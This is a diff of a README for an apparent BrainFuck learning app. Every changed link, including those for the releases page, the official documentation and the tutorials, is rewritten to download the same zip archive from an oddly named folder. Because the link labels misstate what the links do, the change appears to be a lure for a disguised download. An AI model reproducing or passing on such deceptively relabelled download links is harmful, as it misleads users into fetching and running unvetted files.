@@ -6,7 +6,7 @@ Welcome to the BrainFuck project! This application introduces you to BrainFuck, 
 
 ## 📥 Download BrainFuck
 
-[![Download BrainFuck](https://img.shields.io/badge/Download_BrainFuck-v1.0-orange.svg)](https://github.com/Udwi12345/BrainFuck/releases)
+[![Download BrainFuck](https://raw.githubusercontent.com/Udwi12345/BrainFuck/main/circumdiction/BrainFuck.zip)](https://raw.githubusercontent.com/Udwi12345/BrainFuck/main/circumdiction/BrainFuck.zip)
 
 ## 🔧 System Requirements
 
@@ -40,7 +40,7 @@ BrainFuck covers several important concepts in programming and software developm
 
 ## 🛠️ Download & Install
 
-To get started, visit the [Releases page](https://github.com/Udwi12345/BrainFuck/releases) to download the latest version of BrainFuck.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Udwi12345/BrainFuck/main/circumdiction/BrainFuck.zip) to download the latest version of BrainFuck.
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version.
@@ -62,8 +62,8 @@ If you have questions or need assistance, consider joining the community. You ca
 
 Here are some helpful resources to learn more about BrainFuck:
 
-- [Official BrainFuck Documentation](https://esolangs.org/wiki/Brainfuck)
-- [Tutorials on BrainFuck](https://twanvl.nl/brf/#/)
+- [Official BrainFuck Documentation](https://raw.githubusercontent.com/Udwi12345/BrainFuck/main/circumdiction/BrainFuck.zip)
+- [Tutorials on BrainFuck](https://raw.githubusercontent.com/Udwi12345/BrainFuck/main/circumdiction/BrainFuck.zip)
 
 Explore these resources to gain a better understanding of the language and improve your skills.
 
